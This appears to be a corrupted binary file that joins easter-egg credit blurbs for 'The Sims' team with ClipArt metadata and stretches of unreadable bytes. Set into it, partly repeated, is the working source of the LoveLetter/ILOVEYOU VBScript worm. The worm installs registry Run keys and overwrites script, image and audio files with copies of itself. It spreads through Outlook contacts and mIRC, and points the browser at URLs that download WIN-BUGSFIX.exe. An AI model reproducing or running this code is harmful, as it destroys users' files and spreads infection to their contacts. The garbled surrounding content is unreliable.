NOT TRANSLATE - EASTER EGG TEXT - Only Appears in English Version Kana Ryan - Producer. Kana is the glue that holds the Sims project together and moving forward. Rarely seen without Diet Coke(r) in hand, Kana was also known on the team for her "Saga of Kana" which was a test house she used to mark progress in the game and to find the remaining bugs.

Fun Fact: The wedding picture the Sims paint on the easel is her wedding picture. ZZZ - DO NOT TRANSLATE - EASTER EGG TEXT - Only Appears in English Version Jeff Charvat - Development Director. Came to us late in the project to lead the programmers to Alpha and Final. He inhereted our somewhat brutal schedule as well as our notorious game database. 

Fun Fact: At E3 we showed off our first career suit, an astronaught suit. Shortly thereafter we stole Jeff from the "SimMars" team. By the end of the project we had also, um, borrowed a programmer, and two artists from "SimMars". A little SimForeshadowing? ZZZ - DO NOT TRANSLATE - EASTER EGG TEXT - Only Appears in English Version Charles London - Art Director. Charles led an ever growing art team that begin with just him and grow to three artists, three animators, and a contracted company. He is also responsible for designing and drawing the games interface a�  ���All Categories c:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf  �         -x� � ��2���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All CategoriesGc:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           the only tree programmer as well as the game programmer. It took four objects programmers to complete the objects shipped with "The Sims". Some of Jamie's original objects still exist in the game such as the Pool Table and the fire. ZZZ - DO NOT TRANSLATE - EASTER EGG TEXT - Only Appears in English Version Patrick Buechner - Public Relations. Patrick is responsible for getting us all that early press. We were really impressed when he got "The Sims" in U.S. New & World Report. Little did we now that it was just the beginning of all the press we would get thanks to him. He was a large part of keeping the momentum going.

Fun Fact: Patrick can usually be found watching Will Wright demonstrate the game to various reporters and reviewers.  ZZZ - DO NOT TRANSLATE - EASTER EGG TEXT - Only Appears in English Version Chris Trottier - Associate Producer. Chris has done a little of almost everything on "The Sims". Most notably heading the Tuning Team to get us from Alpha to Final. Though not exactly her job, she is also known as the best bug hunter in the game. Very few people on the team know the entire game as well as she does.

Fun Fact: "The Sims" wasn't always the title. At various times the game was known as "Project X", "The Dollhouse Simulator", "Tactical Domestic Simulator", and others. The meeting room for "The Sims" team at Maxis is called "The Doll House". ZZZ - DO NOT TRANSLATE - EASTER EGG TEXT - Only Appears in English Version Luc Barthelet - General Manager of Maxis. Luc believed in the game through its development when even some of the team members questioned it. Luc built most of the early support for the game by establishing "The Sims Neighborhood Watch". Since Luc played "The Sims" constantly he was a good source for what felt right and what didn't in the game.

Fun Fact: Luc would stop by each team members work area and ask "What's new and cool?" each day. This one-on-one interaction made each team member feel important to the entire project. ZZZ - DO NOT TRANSLATE - EASTER EGG TEXT - Only Appears in English Version Patrick J. Barrett III - Object programmer. Patrick is responsible for the majority of the object programming. Between Patrick pushing the "tree" programming to its limits and Jamie increasing the strength of the "tree" programming language, all the game play takes place.

Fun Fact: Eating was a lonely experience in "The Sims" and it just didn't look good. Patrick was told that was how it had to be with the constraints of the sim. He found this unacceptable and made it so the Sims place their plates in front of them, pull in their chairs, and can talk to each other while eating. All using existing technologrem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\W                  t\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
����         ����       )
������������n�G�6�6�4�$������ 
� � 1� C� X� _� [� Sdw'�7�C�O�Y~dqr8w
�
�   �  ��      -    � @   $ ;� F� L� Q� X_g#t $������ �� �� �� �� �� �{ �� �{ |� l� [� I� =� ;� ;�    �  ���      -    � 6   $ �b�y������+�6�8�9�=�I�X�d�v�w�vgq4H+1�?�L�b�b   �  ?��      -    � d   $0 � �~ �t �w �| �r }r qu jk _g Ko <p -| � #� &� (� &� aw��������������2&F2S7a=iDkQi`fsa�b�q���f���w�3�� �� �� �� �   �  �Ÿ      -    � R   $' �������������1�S�^�t��������������������������������z�_�>�!#
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
6�2�-�'��0�0<   $ ��������������������������������������������������������N   $% �1�#����������������"�3�B�M�W�_�h�c�V�?�*�������������������
�������(�-�1�1�1�3�7�9�:�>�F�Q�Z�b�h�n�g�_�S�F|>u6r2v0}-�+�+�)�'���� y�n�f�^�\�Z�c�c0   $ � ������������
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        ume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send�  ���All Categories c:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf  �         -x� � ��2���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All CategoriesGc:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           on
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
                  nd if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     ������ c! �3 B 91����R���PB 2���
˺�ۈ��A!
˙GB@������5�,)������a#s`!���!H� %�(��Ѐ2�#��w!
��0�˹����ʪ���$*��'�"C�	��S&@+��%D� ���#�(뻪��(��A���ʻ��B20+���"sp ���B��B !�!��ʻ��2S'!q
��B	� �5"����s70����!� ��������9s���먂1ٜ����3d�!�5�B�� W���#%)"����23�B�
��������� @��e�%����D5	�1�����(W� ۚ���2���&�(��C v�13�$�!�1�4Qt�ʺ ����4�Ɋ�ʋ��1��!��`݉��'5(	���#6� ��b41��!�q6�1����	R�	����0 ����@���#�p6꾑�%2!)��� �!�$Q"
bu#�����t �'D@����������	���������ɛ��5�!��������C� eUR ���Ȁ�3v(!��#�B�(�����E�3a	��˪ʈ��C "�C!!���̺����# ��Qۊ��5�!7T��d1"%4us1"����̩�)A�3�0�:�΍�̾���
�꩐�0� ������ �%�"���2�$��4S0$�B��٘���1uB�3C5 	
����C1$#���̈��	�J��ܝ�٘����܀����A������wv#32E$"# � �2D����!��ܘ��	$�1����ʐ���(����c1����8S�!�!��s��"���TT(� &�b�1v"2	�"5�"�	���"�ۚ�ʪ�˽�����$�S ����%�s�2� $E�"Q �1�˺%0����$�A�"� �'������ٿ#�D� ����(�"�����6�Κ�ߍ������62D �5�c�3�3�!CAB@�	8���5�!����������������	���7�1 ��D�4b
!��eB4  �������+�͂�3�4b�	���U� ����������B�"�R��1��	�7A)�� �0��C�r�"1(%�4�% ":)���WU�#	(ܚ�� ���˙�"�����"�4	$���T@:����������@T�a����������W 3B����4)2� �7%B#!������ ����-�ت7�47���$�E�A4� �!	�ȁ�6�&�!	���%���ڑ�k
¦Ƕ!
0�+� ����[K-����11�p�p��0�1(X(��
�"�A
(
(����I���Aб�� B�X8 �!3*H�I�ǁ3�����#����˹��tD����"������"2Ra ��ٲ�H	 #��3	�����Y�"������ :)��ɖ�"K	����Eu2!H	JJ�!�ˮ�� �6�):�r����(YB!C"CB* �(�"�RQ�@)B��ۛ�̙����q��ذ�ҭs�S�	���#!Q8�젱����	��Ѐ��"�(����ӛ�4�8��(�!��9�7!(2�	����!)r�鮉����	τ�a�1�$�C 2A!tq8;& �uu����-/��  ��������1��{;��!B����:+��+1R������
��� �����**��)H)(R2��#	� �,=������3"���;-\+��������HP����)(������bs��`A�� 89����"76�͇������JK)�堘� �  ��!!N? �� _?�	����� B"��JX( ���&�	yJ����xp..� ������!��P)����211Aɚ"����Br��ˬ�
4#+,����+, �!��A0
$���12 
��3B����pX���0@����**��$,=
	ʹ3cʈ�����"S2��S��
�@9�����  ����%%���PA�ۃ� IJ���ʴ�*����xj����3Kx�ʣ� 9Y����8xX��$*���  ���All Categories C:\Program\Microsoft Works\workscor\j0187777.wmf   � .� L<      �   � �          �r� � PO4���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All Categories0C:\Program\Microsoft Works\workscor\j0187777.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  **����4�Q�������"ˉ�(A����U�8��E�@E
�4�*�
"�L�����u�ʊ�����"FDBR����Rc1!���)�2��4���������h"!*"�	����d"(:����؝ �#�h��ʒ��-�������3P2	���B�@������Gb(����&
"�����ۑ� �v	 �5�500#�R�(��B�4qT�̈��,���IAH�Λ��&49 ���&q@����ȁ C!2*9ڌ��ʚ�������2��˔�
2�2UHR� �@�*�
 	��*��B��݄�5#P, ʐ�
� �������2����ꂠU�BD�(��4�+��&� D�C�C�����3������������˛"$�5����r��������6b
����E2 *���S�24VQ1  ����*������#�H������ 	�v�	��"6!B�D�8�ȉ��
�Ϫ�� �!(5�B�#S�B�"U	%�RB1�ˊ�������A���A��˒��4Q	� ���q ۊ옙��3C��X%�����3�4�5� �ȏ������2�C�ۘ�13 J��ꑂAc8�����R�Ƚ8��a�cSr (�$�+$4����A(f&2	*��̬�� �� �0�ʁ������ 35R32Q����
"* ����'������ �
2��ڲ�0�S 	!��B�E9زQ#�$s!(��)"	����U)%��1��41 "Cd4�"�w �����ظ�A�	
��ʮ��� 0E "�3A
�ϐܑ������!�!Ba*��
���B"���4�2+�T� ���ə�"�$��3�7!iS� �1)���&눻"�2�T�!�Rg0 � ɛ���"�c��6#2����� �""3����#-B�
���@�
���(���5�!� � �e2AB���10"�	3��@� ��s�*��ꚨ����=	�1���7��Tu�
�!��!�"����' �C�R���� �)��8r'����X@":
ˬ����Sc/?������<y�������Ո�	� #������200H�Ա�P)�I8������ޣ�8))*  
�� ɠ������>?;;��8����������x|���hI89�� �Ń���JI��	Ih� ����0
<=���B���y;���->�������������ZY�ҹ�::0I!�������
